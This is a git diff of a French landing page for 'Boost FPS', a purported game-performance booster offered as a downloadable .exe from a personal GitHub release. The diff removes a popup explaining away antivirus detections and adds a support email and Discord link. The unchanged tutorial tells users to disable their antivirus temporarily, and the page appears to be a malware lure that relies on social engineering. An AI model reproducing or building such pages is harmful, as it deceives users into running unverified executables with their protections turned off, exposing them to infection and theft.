@@ -93,79 +93,19 @@
             transform: scale(1.05);
         }
 
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
+        .contact-info {
+            font-size: 1.1em;
+            margin-top: 15px;
         }
 
-        .antivirus-warning {
-            background-color: #ffcc00;
-            color: #333;
-            padding: 10px;
-            margin: 15px auto;
-            font-size: 0.9em;
-            border-radius: 5px;
-            width: 90%;
-            max-width: 600px;
-        }
-
-        .antivirus-warning a {
+        .contact-info a {
             color: #ff6f61;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .contact-info a:hover {
             text-decoration: underline;
-            cursor: pointer;
-        }
-
-        /* Style de la fenêtre pop-up */
-        .popup {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: white;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
-            border-radius: 10px;
-            width: 90%;
-            max-width: 500px;
-            padding: 20px;
-            text-align: center;
-            z-index: 1000;
-        }
-
-        .popup h2 {
-            margin-bottom: 10px;
-        }
-
-        .popup p {
-            font-size: 0.9em;
-            color: #333;
-        }
-
-        .popup .close-btn {
-            background: #ff6f61;
-            color: white;
-            border: none;
-            padding: 10px;
-            margin-top: 10px;
-            cursor: pointer;
-            border-radius: 5px;
-        }
-
-        .popup .close-btn:hover {
-            background: #ff4c3b;
-        }
-
-        /* Fond noir derrière la pop-up */
-        .overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.5);
-            z-index: 900;
         }
 
         footer {
@@ -190,6 +130,7 @@
         <a href="#" onclick="showSection('home')">Accueil</a>
         <a href="#" onclick="showSection('version')">Version</a>
         <a href="#" onclick="showSection('tuto')">Tutoriel</a>
+        <a href="#" onclick="showSection('contact')">Contact Support</a>
     </nav>
 
     <div class="container">
@@ -197,11 +138,6 @@
             <h2>Optimise ton expérience de jeu</h2>
             <p>Boost FPS t'offre une expérience fluide et performante. Télécharge maintenant !</p>
             
-            <div class="antivirus-warning">
-                <p><strong>Avis important :</strong> Certains antivirus peuvent détecter notre application comme une menace à cause de la manière dont elle optimise les performances. <br>
-                <strong><a href="#" onclick="openPopup()">En savoir plus</a></strong></p>
-            </div>
-
             <a href="https://github.com/seyzperly572/New/releases/download/boostfps/boostfps2.0.exe" download="boostfps2.0.exe" class="download-button">Télécharger</a>
         </section>
 
@@ -216,19 +152,20 @@
             <p>2. Désactive ton antivirus temporairement si nécessaire.</p>
             <p>3. Lance l'installation et suis les instructions.</p>
         </section>
+
+        <section id="contact" class="section">
+            <h2>Contact Support</h2>
+            <p>Si tu as besoin d'aide, n'hésite pas à nous contacter :</p>
+            <div class="contact-info">
+                📧 Email : <a href="mailto:studio-booster@gmail.com">studio-booster@gmail.com</a><br>
+                🔗 Discord : <a href="https://discord.gg/gdk29Aac" target="_blank">Rejoindre le serveur</a>
+            </div>
+        </section>
     </div>
 
     <footer>
         <p>&copy; 2025 Boost FPS. Optimise tes jeux maintenant !</p>
     </footer>
-
-    <!-- Fenêtre pop-up -->
-    <div class="overlay" id="overlay" onclick="closePopup()"></div>
-    <div class="popup" id="popup">
-        <h2>Pourquoi mon antivirus détecte Boost FPS ?</h2>
-        <p>Notre application utilise des scripts d'optimisation avancés, ce qui peut parfois être considéré comme suspect par les antivirus. Il n'y a aucun virus, seulement des optimisations pour améliorer votre expérience de jeu.</p>
-        <button class="close-btn" onclick="closePopup()">Fermer</button>
-    </div>
 
     <script>
         function showSection(sectionId) {
@@ -236,16 +173,6 @@
                 section.classList.remove('active');
             });
             document.getElementById(sectionId).classList.add('active');
-        }
-
-        function openPopup() {
-            document.getElementById("popup").style.display = "block";
-            document.getElementById("overlay").style.display = "block";
-        }
-
-        function closePopup() {
-            document.getElementById("popup").style.display = "none";
-            document.getElementById("overlay").style.display = "none";
         }
     </script>
 
